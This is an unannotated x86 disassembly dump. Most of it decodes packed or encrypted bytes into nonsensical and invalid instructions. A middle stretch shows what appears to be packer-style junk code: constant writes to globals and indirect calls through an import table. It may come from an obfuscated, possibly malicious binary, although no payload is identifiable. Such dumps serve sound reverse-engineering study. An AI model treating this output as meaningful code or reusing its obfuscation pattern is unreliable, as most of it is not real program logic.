  40221b:	inc    edi
  40221c:	dec    edx
  40221d:	xchg   ecx,eax
  40221e:	mov    esp,0xf19fefe
  402223:	mov    esi,edi
  402225:	jb     0x402202
  402227:	push   esp
  402228:	add    DWORD PTR [edx],0x61
  40222b:	(bad)  
  40222d:	inc    ebx
  40222e:	mov    bl,0x6d
  402230:	in     eax,0xc8
  402232:	rcl    BYTE PTR [edx+0x7c],0x4
  402236:	xchg   esp,eax
  402237:	jbe    0x402222
  402239:	idiv   DWORD PTR [ebx]
  40223b:	icebp  
  40223c:	mov    ds:0x33af03f,al
  402241:	mov    ebx,0xfa844774
  402246:	mov    al,0xba
  402248:	pusha  
  402249:	push   ds
  40224a:	sbb    BYTE PTR [esi+0x8ac0f2d],bh
  402250:	arpl   WORD PTR [ecx+ebx*1-0x941f295],si
  402257:	and    al,0x2b
  402259:	divps  xmm2,XMMWORD PTR ds:0x46956168
  402260:	jmp    0xe2b5:0x65dc0c03
  402267:	aam    0xf6
  402269:	je     0x402236
  40226b:	call   0xa358:0xde1b28b3
  402272:	mov    ebp,0xd98ed4d7
  402277:	in     al,0x24
  402279:	and    BYTE PTR [edi+0x58],dh
  40227c:	jbe    0x40225b
  40227e:	cmc    
  40227f:	je     0x4022fa
  402281:	sub    eax,0x8a03689e
  402286:	mov    bh,0xab
  402288:	lods   eax,DWORD PTR ds:[esi]
  402289:	repnz mov esp,0x667a6e3c
  40228f:	aad    0x82
  402291:	test   BYTE PTR [esi],cl
  402293:	std    
  402294:	call   0xcc12ff9a
  402299:	(bad)
  40229c:	sahf   
  40229d:	out    0xf2,eax
  40229f:	fs cdq 
  4022a1:	jnp    0x4022a0
  4022a3:	sbb    DWORD PTR [edx+0x14],edi
  4022a6:	in     al,dx
  4022a7:	lods   al,BYTE PTR ds:[esi]
  4022a8:	rcl    DWORD PTR [ecx-0xb],0x4e
  4022ac:	clc    
  4022ad:	adc    eax,DWORD PTR [ecx+0x76df4504]
  4022b3:	jl     0x402273
  4022b5:	icebp  
  4022b6:	shl    BYTE PTR [esi+0x0],cl
  4022b9:	inc    esp
  4022ba:	ret    0xc5d9
  4022bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4022be:	sub    esi,eax
  4022c0:	mov    dh,0x85
  4022c2:	push   eax
  4022c3:	xor    eax,0xd144657
  4022c8:	xor    DWORD PTR [eax+ecx*4],0x58
  4022cc:	pop    ds
  4022cd:	cmp    DWORD PTR [ebp-0x15],edi
  4022d0:	add    ebx,DWORD PTR [eax]
  4022d2:	jb     0x4022ed
  4022d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4022d5:	call   0xa5448d7
  4022da:	pop    es
  4022db:	in     al,0xc1
  4022dd:	mov    edx,0xb7200a5d
  4022e2:	push   esi
  4022e3:	ror    DWORD PTR [ecx],cl
  4022e5:	pushf  
  4022e6:	xor    bh,cl
  4022e8:	out    0x9e,eax
  4022ea:	out    dx,eax
  4022eb:	mov    ecx,0x6531b562
  4022f0:	push   cs
  4022f1:	dec    esi
  4022f2:	clc    
  4022f3:	dec    ecx
  4022f4:	pushf  
  4022f5:	add    eax,0x49a7787b
  4022fa:	scas   eax,DWORD PTR es:[edi]
  4022fb:	xchg   ebp,eax
  4022fc:	data16 clc 
  4022fe:	and    al,0xcb
  402300:	aad    0x28
  402302:	aam    0x9f
  402304:	dec    ebp
  402305:	je     0x402384
  402307:	lds    eax,FWORD PTR [esi+ecx*4]
  40230a:	inc    esp
  40230b:	and    ebp,DWORD PTR [edi-0x4c]
  40230e:	xchg   ebx,eax
  40230f:	retf   0x6e96
  402312:	xor    al,bl
  402314:	cmp    eax,0xb8eead08
  402319:	add    ebx,edx
  40231b:	in     eax,dx
  40231c:	not    DWORD PTR [eax-0x37819204]
  402322:	por    mm4,mm4
  402325:	ss (bad) 
  402327:	sti    
  402328:	pushf  
  402329:	dec    ecx
  40232a:	sbb    al,0xed
  40232c:	retf   
  40232d:	outs   dx,BYTE PTR fs:[esi]
  40232f:	out    0x8c,al
  402331:	out    0xd5,eax
  402333:	jbe    0x4022f3
  402335:	cmp    dh,BYTE PTR fs:[edi]
  402338:	popf   
  402339:	jp     0x4023ad
  40233b:	jl     0x40238e
  40233d:	sahf   
  40233e:	xchg   esi,eax
  40233f:	mov    ebx,0xf98f2cb
  402344:	push   ebp
  402345:	xor    DWORD PTR [esi+0x6b],ebx
  402348:	rol    BYTE PTR [esi+0x243cfcdb],1
  40234e:	cdq    
  40234f:	mov    al,0xbf
  402351:	push   esp
  402352:	std    
  402353:	lods   al,BYTE PTR ds:[esi]
  402354:	sub    esi,ecx
  402356:	push   0x4
  402358:	shr    BYTE PTR [eax-0x59fe8691],0xd4
  40235f:	dec    DWORD PTR [ebx-0x4d]
  402362:	sub    ch,BYTE PTR [ebp+0xa738fd4]
  402368:	and    eax,0x9edb57a5
  40236d:	jo     0x402321
  40236f:	cdq    
  402370:	test   DWORD PTR [edi],eax
  402372:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402373:	mov    dh,0x11
  402375:	add    al,0xc2
  402377:	rol    DWORD PTR [esi],cl
  402379:	(bad)  
  40237a:	pop    edx
  40237b:	or     BYTE PTR [ebp+0x4d],dh
  40237e:	stos   BYTE PTR es:[edi],al
  40237f:	ret    0xb465
  402382:	dec    ecx
  402383:	adc    eax,0xa3473fca
  402388:	addr16 int3 
  40238a:	aad    0xa
  40238c:	mov    BYTE PTR [edi+eiz*2],ah
  40238f:	ja     0x402388
  402391:	test   DWORD PTR [edi],ebp
  402393:	aam    0xfc
  402395:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402396:	ja     0x4023c1
  402398:	mov    ch,0x20
  40239a:	or     DWORD PTR [eax+0x50],edi
  40239d:	daa    
  40239e:	into   
  40239f:	clc    
  4023a0:	stc    
  4023a1:	std    
  4023a2:	call   0x5cb:0xc04887f8
  4023a9:	mov    dx,0xaf52
  4023ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4023ae:	push   esp
  4023af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023b0:	retf   0x28a6
  4023b3:	cmp    DWORD PTR [edi-0x38],edi
  4023b6:	aas    
  4023b7:	stos   BYTE PTR es:[edi],al
  4023b8:	inc    edi
  4023b9:	push   edi
  4023ba:	push   ebx
  4023bb:	jno    0x402356
  4023bd:	push   ds
  4023be:	frstpm(287 only) 
  4023c0:	xchg   ecx,eax
  4023c1:	mov    ds:0x6cfe3670,eax
  4023c6:	fisubr WORD PTR [eax+0x5e]
  4023c9:	mov    ds:0x7b55d286,al
  4023ce:	or     ebp,DWORD PTR [ecx]
  4023d0:	nop
  4023d1:	test   DWORD PTR [ebp-0x513071cc],ebp
  4023d7:	mov    ebx,0xdf42eca3
  4023dc:	adc    cl,BYTE PTR [ebx+0x53b3c0b1]
  4023e2:	dec    edx
  4023e3:	pop    ebx
  4023e4:	lahf   
  4023e5:	data16 in al,dx
  4023e7:	lods   eax,DWORD PTR ds:[esi]
  4023e8:	inc    esp
  4023e9:	cmp    edi,DWORD PTR [eax-0x1a]
  4023ec:	outs   dx,DWORD PTR ds:[esi]
  4023ed:	test   BYTE PTR [edi-0x31],al
  4023f0:	xchg   BYTE PTR [eax+eiz*1+0x1b],dl
  4023f4:	(bad)  
  4023f5:	call   0xc41d:0xf7e26c9d
  4023fc:	mov    ds:0xa489829d,eax
  402401:	xor    esp,DWORD PTR [eax-0x6d198c48]
  402407:	sbb    al,0xb3
  402409:	jnp    0x4023c9
  40240b:	add    ah,bh
  40240d:	xor    dh,BYTE PTR [esi-0x2c0c6305]
  402413:	mov    edx,0x4c222926
  402418:	ja     0x4023f4
  40241a:	inc    esp
  40241b:	(bad)
  40241f:	(bad)  
  402420:	test   eax,0xb46bac81
  402425:	adc    DWORD PTR [ebx+ebp*1-0x99476a],edi
  40242c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40242d:	inc    edx
  40242e:	stc    
  40242f:	sbb    esp,edi
  402431:	mov    al,0x50
  402433:	in     eax,dx
  402434:	and    BYTE PTR [ecx+0x5ba42e83],0xc2
  40243b:	push   esp
  40243c:	nop
  40243d:	cdq    
  40243e:	int3   
  40243f:	jg     0x402469
  402441:	mov    dh,0xfc
  402443:	imul   ecx,ebp,0x79b50170
  402449:	gs int3 
  40244b:	xchg   edi,eax
  40244c:	scas   eax,DWORD PTR es:[edi]
  40244d:	stos   BYTE PTR es:[edi],al
  40244e:	ret    
  40244f:	jle    0x4024c0
  402451:	cmp    DWORD PTR [ebx],ecx
  402453:	mov    cl,0xd9
  402455:	nop
  402456:	push   ss
  402457:	jp     0x402452
  402459:	fwait
  40245a:	int    0xd8
  40245c:	jnp    0x40247e
  40245e:	out    0x7e,al
  402460:	test   DWORD PTR ds:0x323c9f46,0xd75a550f
  40246a:	push   ds
  40246b:	xor    ecx,esp
  40246d:	imul   eax,DWORD PTR [edx+0x20eedb58],0x71c9f292
  402477:	int3   
  402478:	mov    bl,0xb9
  40247a:	inc    ecx
  40247b:	mov    al,0x39
  40247d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40247e:	inc    eax
  40247f:	mov    bh,0x47
  402481:	hlt    
  402482:	mov    cl,0xe6
  402484:	outs   dx,BYTE PTR ds:[esi]
  402485:	(bad)  
  402486:	cwde   
  402487:	lds    ecx,FWORD PTR [ebx]
  402489:	pushf  
  40248a:	sbb    DWORD PTR [esi-0x2a],0x1bc36269
  402491:	out    dx,al
  402492:	xchg   edx,eax
  402493:	sti    
  402494:	or     al,0x5b
  402496:	sbb    eax,0x2ecb3a08
  40249b:	es in  eax,dx
  40249d:	jns    0x402499
  40249f:	push   ebp
  4024a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4024a1:	jg     0x4024e8
  4024a3:	xchg   edi,eax
  4024a4:	dec    ebp
  4024a5:	pop    esi
  4024a6:	pushf  
  4024a7:	int3   
  4024a8:	jno    0x402509
  4024aa:	push   edi
  4024ab:	xor    ebx,ebp
  4024ad:	dec    edi
  4024ae:	out    dx,al
  4024af:	or     DWORD PTR [esp+eax*8],0xffffffc4
  4024b3:	add    eax,0xf7aa8068
  4024b8:	fnstcw WORD PTR [edx+0xb]
  4024bb:	call   0x7a41:0x1caff380
  4024c2:	mov    bh,0x8b
  4024c4:	(bad)  
  4024c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4024c6:	jecxz  0x4024c2
  4024c8:	in     al,dx
  4024c9:	nop
  4024ca:	xor    BYTE PTR [ecx],0xf7
  4024cd:	repz adc al,0xb1
  4024d0:	and    bl,0x7e
  4024d3:	sti    
  4024d4:	inc    ecx
  4024d5:	dec    esp
  4024d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4024d7:	lds    edi,FWORD PTR [edi]
  4024d9:	and    ah,BYTE PTR [esi]
  4024db:	sar    BYTE PTR [edx-0x3b],0xb2
  4024df:	or     al,0x7d
  4024e1:	xchg   DWORD PTR ds:0x92f065a1,esi
  4024e7:	hlt    
  4024e8:	fdiv   DWORD PTR [edi+0x7c]
  4024eb:	push   0xdc0e69c5
  4024f0:	inc    ebx
  4024f1:	jbe    0x40251d
  4024f3:	test   eax,0xd8ab5be0
  4024f8:	mov    ebp,0x4539394e
  4024fd:	cs int3 
  4024ff:	cs test al,0x99
  402502:	push   ebx
  402503:	jns    0x402508
  402505:	stos   BYTE PTR es:[edi],al
  402506:	xor    BYTE PTR [ebx-0x4f],ch
  402509:	or     bl,BYTE PTR [edi]
  40250b:	mov    esi,0xb2c83d68
  402510:	push   esi
  402511:	xlat   BYTE PTR es:[ebx]
  402513:	push   ss
  402514:	dec    esi
  402515:	dec    ebx
  402516:	enter  0xfe3a,0x3
  40251a:	gs mov edi,0xe5fbeff4
  402520:	(bad)  
  402521:	xchg   esi,eax
  402522:	lods   eax,DWORD PTR ds:[esi]
  402523:	jle    0x40255b
  402525:	jle    0x402531
  402527:	mov    esi,0xaed3574a
  40252c:	test   al,0x59
  40252e:	jecxz  0x402596
  402530:	add    BYTE PTR [ebx],cl
  402532:	int    0xa3
  402534:	pusha  
  402535:	mov    eax,0x6cce900c
  40253a:	add    DWORD PTR [ebx+0x2dcc481],esi
  402540:	inc    esi
  402541:	call   0xde07:0xd9ac4e9b
  402548:	push   esp
  402549:	or     dl,BYTE PTR [edi-0x1b]
  40254c:	cdq    
  40254d:	loopne 0x40255e
  40254f:	aam    0xe8
  402551:	jp     0x4025a2
  402553:	cli    
  402554:	jnp    0x40259c
  402556:	inc    ebp
  402557:	ror    DWORD PTR ds:0xf27241e2,1
  40255d:	xor    DWORD PTR [ecx-0x26],0x0
  402561:	jp     0x4025a3
  402563:	mov    dh,BYTE PTR [ebp+ebx*4-0x44472fba]
  40256a:	or     BYTE PTR [edx-0x4],ch
  40256d:	aad    0xbd
  40256f:	pop    ebp
  402570:	ret    
  402571:	and    bl,BYTE PTR [ebx+0x256e0897]
  402577:	icebp  
  402578:	jmp    0x88cf:0x3d5f57c5
  40257f:	hlt    
  402580:	shr    BYTE PTR [ebx],cl
  402582:	shl    DWORD PTR [ecx+0x5e66c19],0xf7
  402589:	or     DWORD PTR [edi],edi
  40258b:	addr16 sub BYTE PTR [bp+si+0x7a80],0xc
  402592:	push   es
  402593:	or     DWORD PTR [edx],ecx
  402595:	xor    eax,0xbd804005
  40259a:	fbstp  TBYTE PTR [edx+0x1aa4b764]
  4025a0:	jmp    0xdf3734c0
  4025a5:	arpl   WORD PTR [eax-0x5188bc25],di
  4025ab:	(bad)  
  4025ac:	scas   al,BYTE PTR es:[edi]
  4025ad:	push   0x35936e2a
  4025b2:	pop    eax
  4025b3:	jmp    0x2a29:0x9bb20a4f
  4025ba:	push   eax
  4025bb:	xor    eax,0xa40cf7a7
  4025c0:	test   al,0x77
  4025c2:	dec    esp
  4025c3:	cld    
  4025c4:	std    
  4025c5:	mov    edx,0xf66ca15d
  4025ca:	mov    dl,BYTE PTR ds:0x45c70e69
  4025d0:	nop
  4025d1:	jb     0x40260e
  4025d3:	add    BYTE PTR [eax],al
  4025d5:	movzx  eax,WORD PTR ds:0x42834f
  4025dc:	adc    DWORD PTR ds:0x4281db,eax
  4025e2:	mov    DWORD PTR [ebp-0x6c],0x3abc
  4025e9:	adc    DWORD PTR ds:0x4281c3,edi
  4025ef:	mov    DWORD PTR [ebp-0x68],0x1b45
  4025f6:	cmp    DWORD PTR ds:0x4281b7,0x0
  4025fd:	mov    DWORD PTR ds:0x428363,0x76b5
  402607:	mov    DWORD PTR ds:0x4281bf,edx
  40260d:	mov    DWORD PTR ds:0x4282d7,0x4dfd
  402617:	jmp    0x40267d
  40261c:	mov    eax,ds:0x4282c3
  402621:	mov    eax,0x8f5
  402626:	cmp    DWORD PTR ds:0x4281b7,0x0
  40262d:	ja     0x402669
  402633:	push   DWORD PTR [ebp-0x14]
  402636:	push   0x1475
  40263b:	push   0x3d07
  402640:	push   0x42828f
  402645:	call   DWORD PTR ds:0x428dec
  40264b:	sbb    DWORD PTR ds:0x4283db,0x36f
  402655:	adc    DWORD PTR ds:0x42835f,0x4281e7
  40265f:	sub    DWORD PTR ds:0x4283cf,0x42836b
  402669:	and    DWORD PTR ds:0x4281af,0x42829b
  402673:	add    DWORD PTR ds:0x42836f,0x6611
  40267d:	mov    DWORD PTR [ebp-0x64],0x767d
  402684:	sub    eax,DWORD PTR ds:0x4281b7
  40268a:	mov    DWORD PTR [ebp-0x60],0x1d973857
  402691:	mov    DWORD PTR [ebp-0x5c],0x0
  402698:	add    DWORD PTR ds:0x4281ab,0x47ea
  4026a2:	mov    DWORD PTR [ebp-0x34],0x599d
  4026a9:	mov    DWORD PTR [ebp-0x2c],0x165d
  4026b0:	cmp    DWORD PTR ds:0x4282df,0x0
  4026b7:	mov    DWORD PTR ds:0x42833f,edx
  4026bd:	mov    DWORD PTR ds:0x42829b,ecx
  4026c3:	mov    DWORD PTR ds:0x4281c3,edx
  4026c9:	mov    DWORD PTR ds:0x4282bf,0x4bd1
  4026d3:	jmp    0x402743
  4026d8:	mov    eax,ds:0x4281ab
  4026dd:	mov    DWORD PTR ds:0x4282df,edx
  4026e3:	cmp    DWORD PTR ds:0x4282df,0x0
  4026ea:	jg     0x402726
  4026f0:	push   DWORD PTR [ebp-0x28]
  4026f3:	push   0x2b2a
  4026f8:	push   0x1aa6
  4026fd:	push   0x3603
  402702:	call   DWORD PTR ds:0x428df0
  402708:	add    DWORD PTR ds:0x4282e7,0x428347
  402712:	sub    DWORD PTR ds:0x428363,0x6e4a
  40271c:	xor    DWORD PTR ds:0x4281bb,0x16a6
  402726:	dec    DWORD PTR ds:0x4281d7
  40272c:	and    DWORD PTR ds:0x4282bb,edx
  402732:	or     DWORD PTR ds:0x42834b,edx
  402738:	mov    eax,ds:0x4281df
  40273d:	and    DWORD PTR ds:0x4283f3,eax
  402743:	mov    DWORD PTR [ebp-0x1c],0xc51
  40274a:	movzx  eax,WORD PTR ds:0x4283f3
  402751:	sbb    DWORD PTR ds:0x4282bf,eax
  402757:	mov    DWORD PTR [ebp-0x44],0x3f55
  40275e:	or     eax,0x5124
  402763:	mov    DWORD PTR [ebp-0x44],0x1
  40276a:	adc    DWORD PTR ds:0x42829f,0x6ac9
  402774:	mov    DWORD PTR [ebp-0x44],0x42e8
  40277b:	mov    eax,DWORD PTR [ebp-0x60]
  40277e:	dec    DWORD PTR ds:0x428353
  402784:	shl    ecx,0x1e
  402787:	not    ecx
  402789:	mov    ecx,DWORD PTR [ebp-0x5c]
  40278c:	jmp    0x402b6a
  402791:	out    dx,eax
  402792:	repz (bad) 
  402794:	cmp    bh,BYTE PTR [ebx+0x63226a1a]
  40279a:	pop    ds
  40279b:	and    eax,0x4376b0aa
  4027a0:	push   0x30
  4027a2:	cld    
  4027a3:	sbb    BYTE PTR [eax],bl
  4027a5:	sahf   
  4027a6:	adc    bl,BYTE PTR [eax]
  4027a8:	sbb    BYTE PTR [edi],bl
  4027aa:	push   0x8b926c6
  4027af:	(bad)  ds:0x82babd26
  4027b5:	adc    BYTE PTR [eax-0x65],dl
  4027b8:	sbb    BYTE PTR [ebx],0x56
  4027bb:	and    dh,bh
  4027bd:	fisub  WORD PTR gs:[eax+0x3b]
  4027c1:	ja     0x40280f
  4027c3:	adc    al,0x6b
  4027c5:	shl    BYTE PTR [esi+0x70990964],cl
  4027cb:	push   ebx
  4027cc:	push   eax
  4027cd:	mov    esp,0x216c213
  4027d2:	cmp    dh,BYTE PTR [edi-0x3c1e397c]
  4027d8:	fucomp st(7)
  4027da:	pop    es
  4027db:	cmp    eax,0xa70f11e9
  4027e0:	push   ebp
  4027e1:	inc    edx
  4027e2:	mov    ebp,0x529b433
  4027e7:	shl    DWORD PTR [esi-0x7f],0x60
  4027eb:	adc    BYTE PTR [ecx],0xde
  4027ee:	int3   
  4027ef:	cmp    eax,0x8302aacb
  4027f4:	cmp    cl,BYTE PTR [eax-0x6dd34c84]
  4027fa:	inc    ecx
  4027fb:	push   esi
  4027fc:	jp     0x40278a
  4027fe:	(bad)  
  4027ff:	adc    BYTE PTR [ecx],bl
  402801:	push   0xfe64304a
  402806:	fidivr WORD PTR [ecx-0xd]
  402809:	pop    eax
  40280a:	or     BYTE PTR [esi-0x1b],ch
  40280d:	adc    DWORD PTR [edx+0x526fb59c],0xfffffffc
  402814:	sub    BYTE PTR [eax],bh
  402816:	mov    esp,0x715b88a6
  40281b:	mov    edx,DWORD PTR fs:[eax]
  40281e:	dec    DWORD PTR [esi-0x37]
  402821:	jbe    0x4027ab
  402823:	mov    ah,al
  402825:	cmp    BYTE PTR [esp+esi*1+0x27],0x39
  40282a:	jns    0x402895
  40282c:	and    al,0x85
  40282e:	cmp    eax,0xd075a615
  402833:	sbb    al,BYTE PTR [edi]
  402835:	shl    DWORD PTR [esi+ebx*2+0x72],0xe8
  40283a:	jmp    0x4028b5
  40283c:	lahf   
  40283d:	iret   
  40283e:	jmp    0x7a19:0x69782cb2
  402845:	cld    
  402846:	sbb    cl,BYTE PTR [ebp+0x73ad7db5]
  40284c:	xchg   DWORD PTR [edi+0x57c3d2c],ebx
  402852:	push   ecx
  402853:	xchg   DWORD PTR [edx],eax
  402855:	mov    dl,0x31
  402857:	sub    ah,BYTE PTR [esi-0x34]
  40285a:	(bad)  
  40285b:	in     al,dx
  40285c:	out    0x78,eax
  40285e:	inc    ecx
  40285f:	jbe    0x40280e
  402861:	jo     0x402810
  402863:	not    BYTE PTR [edx+0x296a630]
  402869:	cdq    
  40286a:	cdq    
  40286b:	jg     0x4028ae
  40286d:	adc    al,0x7b
  40286f:	mov    al,0x6f
  402871:	lahf   
  402872:	jae    0x40284d
  402874:	inc    eax
  402875:	mov    DWORD PTR [ebp-0x8],ecx
  402878:	mov    eax,esp
  40287a:	cmc    
  40287b:	aad    0x44
  40287d:	scas   eax,DWORD PTR es:[edi]
  40287e:	sbb    al,0x76
  402880:	sbb    DWORD PTR [ecx-0x71],esp
  402883:	jl     0x402852
  402885:	stc    
  402886:	xor    edx,DWORD PTR [edx]
  402888:	push   edi
  402889:	out    0xba,eax
  40288b:	not    DWORD PTR [ebx+edi*4+0x6d]
  40288f:	sbb    eax,0x7354e126
  402894:	cmp    eax,0xed0e667f
  402899:	shl    DWORD PTR [ebp-0xc],cl
  40289c:	outs   dx,BYTE PTR ds:[esi]
  40289d:	int3   
  40289e:	cdq    
  40289f:	cs pusha 
  4028a1:	sbb    al,BYTE PTR [ecx-0x3cfb156d]
  4028a7:	mov    al,0xb9
  4028a9:	jp     0x40287a
  4028ab:	xchg   edi,eax
  4028ac:	push   esi
  4028ad:	fisttp DWORD PTR [edi+edi*2+0x2a]
  4028b1:	cmp    BYTE PTR [ebp-0x72],0xc6
  4028b5:	push   esp
  4028b6:	dec    edi
  4028b7:	les    edi,FWORD PTR [edi+0x2ff5eb2d]
  4028bd:	imul   ecx,DWORD PTR [esi+0x19914066],0xffffffa1
  4028c4:	xchg   edx,eax
  4028c5:	cmp    al,0x4f
  4028c7:	inc    edi
  4028c8:	pop    ebp
  4028c9:	out    0xdd,eax
  4028cb:	dec    BYTE PTR [eax-0x72]
  4028ce:	dec    esi
  4028cf:	add    eax,0x6951bae1
  4028d4:	popa   
  4028d5:	cmp    BYTE PTR [ebp+0x2],cl
  4028d8:	loop   0x402862
  4028da:	imul   DWORD PTR [ecx]
  4028dc:	lea    esp,[edx]
  4028de:	sub    ch,BYTE PTR [ebx]
  4028e0:	xchg   eax,eax
  4028e2:	bound  esp,QWORD PTR [ecx+0x2f49820a]
  4028e8:	and    eax,edi
  4028ea:	neg    DWORD PTR [eax]
  4028ec:	popa   
  4028ed:	enter  0x3f9f,0x76
  4028f1:	jae    0x402890
  4028f3:	bound  esp,QWORD PTR [ebp+edi*2-0x2d84d25f]
  4028fa:	fnstsw WORD PTR [esi]
  4028fc:	xchg   esp,eax
  4028fd:	retf   0xf458
  402900:	outs   dx,DWORD PTR ds:[esi]
  402901:	cld    
  402902:	scas   al,BYTE PTR es:[edi]
  402903:	test   DWORD PTR ds:0xa517110,esi
  402909:	xchg   ecx,eax
  40290a:	fld    TBYTE PTR [edx-0x294d71da]
  402910:	or     eax,0x1daba1fd
  402915:	pop    ebp
  402916:	sti    
  402917:	push   ebp
  402918:	retf   
  402919:	cdq    
  40291a:	mov    ch,0x17
  40291c:	dec    ecx
  40291d:	inc    ebx
  40291e:	aad    0x76
  402920:	(bad)
  402924:	mov    ebp,0x6b3f9a15
  402929:	pop    ds
  40292a:	mov    db3,edx
  40292d:	add    eax,0x178e1cdc
  402932:	enter  0x76dc,0x3f
  402936:	or     eax,0xe257dbd6
  40293b:	mov    bl,0xc4
  40293d:	mov    dl,0x71
  40293f:	push   ds
  402940:	jmp    0x402914
  402942:	into   
  402943:	dec    edi
  402944:	xchg   esi,eax
  402945:	sbb    eax,0x149639bd
  40294a:	mov    bl,0x9e
  40294c:	jmp    0x7652:0x58e8223
  402953:	aam    0x68
  402955:	outs   dx,DWORD PTR ds:[esi]
  402956:	je     0x4029c6
  402958:	push   esp
  402959:	dec    ebp
  40295a:	loop   0x4029b9
  40295c:	outs   dx,BYTE PTR ds:[esi]
  40295d:	mov    ch,0xd4
  40295f:	jne    0x402986
  402961:	outs   dx,DWORD PTR ds:[esi]
  402962:	inc    edi
  402963:	or     eax,0x3d067244
  402968:	pop    esi
  402969:	push   eax
  40296a:	fisttp QWORD PTR [ecx+0x59]
  40296d:	retf   
  40296e:	dec    esi
  40296f:	xchg   BYTE PTR [ecx-0x4c],ah
  402972:	dec    edx
  402973:	sahf   
  402974:	push   esi
  402975:	or     DWORD PTR [ecx],edi
  402977:	mov    eax,ds:0x460c1b69
  40297c:	and    al,0x31
  40297e:	fwait
  40297f:	mov    WORD PTR [esi],fs
  402981:	push   0x5c08d0d5
  402986:	mov    ch,0x27
  402988:	in     al,0x0
  40298a:	out    dx,eax
  40298b:	xchg   BYTE PTR [eax+eax*8-0x6d7303a2],bl
  402992:	iret   
  402993:	outs   dx,BYTE PTR ds:[esi]
  402994:	fstp   DWORD PTR [ebx]
  402996:	pushf  
  402997:	(bad)  
  402998:	aam    0x77
  40299a:	xor    bh,BYTE PTR [ebx+ecx*8]
  40299d:	push   edx
  40299e:	adc    DWORD PTR [ecx],eax
  4029a0:	nop
  4029a1:	std    
  4029a2:	mov    edx,DWORD PTR [edi+edi*4]
  4029a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4029a6:	or     BYTE PTR [ebp-0x6b],ah
  4029a9:	mov    al,0x14
  4029ab:	out    dx,eax
  4029ac:	fadd   DWORD PTR [ecx+ecx*4]
  4029af:	arpl   WORD PTR [esi],bx
  4029b1:	call   DWORD PTR [eax-0x9ef9fe7]
  4029b7:	(bad)  
  4029ba:	mov    ch,0xa7
  4029bc:	enter  0x8c02,0xea
  4029c0:	mov    ebp,es
  4029c2:	clc    
  4029c3:	sbb    al,0x41
  4029c5:	adc    DWORD PTR [eax],ebp
  4029c7:	push   esi
  4029c8:	imul   esp,DWORD PTR ds:0x55ccb56,0xa7b3c728
  4029d2:	cld    
  4029d3:	inc    edx
  4029d4:	rcr    DWORD PTR [ebx-0x7d],0xbd
  4029d8:	into   
  4029d9:	and    DWORD PTR [ebx],esi
  4029db:	pop    esi
  4029dc:	mov    ds:0x83f8a6e1,eax
  4029e1:	ret    0x1c55
  4029e4:	test   al,0x5b
  4029e6:	mov    bh,0x44
  4029e8:	in     al,dx
  4029e9:	mov    bh,0x3e
  4029eb:	jbe    0x4029b1
  4029ed:	adc    ah,cl
  4029ef:	imul   edi,DWORD PTR [edi+0x64],0xffffffb0
  4029f3:	es pop edi
  4029f5:	in     al,0x55
  4029f7:	leave  
  4029f8:	or     al,0x3e
  4029fa:	push   ds
  4029fb:	mov    cl,0x8c
  4029fd:	mov    esi,0xb32772e4
  402a02:	pusha  
  402a03:	ja     0x402988
  402a05:	or     dl,ah
  402a07:	adc    dl,bl
  402a09:	popa   
  402a0a:	shl    ebp,1
  402a0c:	xlat   BYTE PTR ds:[ebx]
  402a0d:	mov    dl,0x21
  402a0f:	mov    al,ds:0xdab7f63d
  402a14:	and    al,0xf8
  402a16:	inc    eax
  402a17:	sub    DWORD PTR [eax+0x7f],0xc
  402a1b:	test   al,0xbf
  402a1d:	iret   
  402a1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a1f:	cwde   
  402a20:	sti    
  402a21:	and    eax,0xd4bd92bf
  402a26:	inc    esi
  402a27:	shr    DWORD PTR [ecx+0x11],cl
  402a2a:	cmp    BYTE PTR [edx-0x73bb3bbb],bh
  402a30:	lods   eax,DWORD PTR ds:[esi]
  402a31:	mov    ds:0xbc096994,al
  402a36:	mov    ds:0x5c004307,eax
  402a3b:	pop    ds
  402a3c:	jle    0x4029dc
  402a3e:	not    ebp
  402a40:	mov    ah,0x3d
  402a42:	imul   esp,DWORD PTR [ebp-0x37ee70bd],0xdafe5307
  402a4c:	add    al,0xbc
  402a4e:	fcom   DWORD PTR [edi+0x75]
  402a51:	jb     0x402a77
  402a53:	(bad)
  402a57:	daa    
  402a58:	fcom   QWORD PTR [ebx]
  402a5a:	test   eax,0xa3888a02
  402a5f:	jo     0x402a7e
  402a61:	sahf   
  402a62:	and    cl,BYTE PTR [esi+ebp*8-0x1d149676]
  402a69:	mov    ss,WORD PTR [edi-0x52e0281f]
  402a6f:	ret    
  402a70:	pop    edx
  402a72:	pop    es
  402a73:	and    DWORD PTR [edi-0x17],edi
  402a76:	out    dx,al
  402a77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a78:	and    eax,0x35279f9a
  402a7d:	xor    BYTE PTR [esi-0x57],0x2d
  402a81:	loop   0x402a40
  402a83:	mov    dl,BYTE PTR ds:0x7b2b1366
  402a89:	or     al,0x3d
  402a8b:	sets   BYTE PTR [esi+0x79ae1602]
  402a92:	repz mov dh,0x5
  402a95:	sub    eax,0x748c028
  402a9a:	mov    ebx,0x7e4965a9
  402a9f:	xor    esp,DWORD PTR [eax-0x399402de]
  402aa5:	xor    DWORD PTR [ecx],ecx
  402aa7:	or     eax,0x42380625
  402aac:	das    
  402aad:	fs xor al,ch
  402ab0:	jp     0x402abe
  402ab2:	sbb    eax,0x3d1dae88
  402ab7:	or     eax,0x3cacd96a
  402abc:	mov    WORD PTR [esi+0xd],cs
  402abf:	inc    ebp
  402ac0:	push   es
  402ac1:	setbe  BYTE PTR [esi-0x3e]
  402ac5:	push   edi
  402ac6:	cmp    eax,0x1dd27400
  402acb:	cmp    cl,BYTE PTR [ebx]
  402acd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ace:	test   eax,0x5142311a
